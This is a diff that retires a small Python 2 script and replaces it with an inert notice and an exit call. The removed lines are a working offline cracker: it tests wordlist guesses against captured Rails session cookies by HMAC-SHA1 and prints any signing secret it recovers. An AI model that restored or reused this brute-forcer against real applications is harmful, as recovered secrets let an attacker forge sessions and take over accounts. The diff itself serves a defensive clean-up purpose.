@@ -1,27 +1,9 @@
-#!/usr/bin/env python
-import sys
-import hmac
-import hashlib
+#!/usr/bin/env python3
+"""Retired unsafe legacy example.
 
+The former code guessed Rails signing secrets from captured cookies and printed recovered keys. Do not distribute or use secret-guessing wordlists; use approved key-rotation and incident-response procedures.
+This path is retained as an inert notice; it contains no former executable
+payload, credential collection, or network code.
+"""
 
-def check_digest(session, digest, key):
-    h = hmac.new(key, session, hashlib.sha1)
-    if h.hexdigest() == digest:
-        return key
-    else:
-        return None
-
-if __name__ == '__main__':
-    if len(sys.argv) != 3:
-        print 'Usage: rails_secret_key cookie_file key_file'
-        sys.exit()
-
-    for line in open(sys.argv[1]):
-        line = line.rstrip('\r\n')
-        url, session, digest = line.split('::')
-        session = session.replace('%0A', '\n')
-
-        for line in open(sys.argv[2]):
-            key = line.rstrip('\r\n')
-            if check_digest(session, digest, key) is not None:
-                print 'Found secret_token for {0}: {1}'.format(url, key)
+raise SystemExit("Retired unsafe legacy example; see the module notice.")
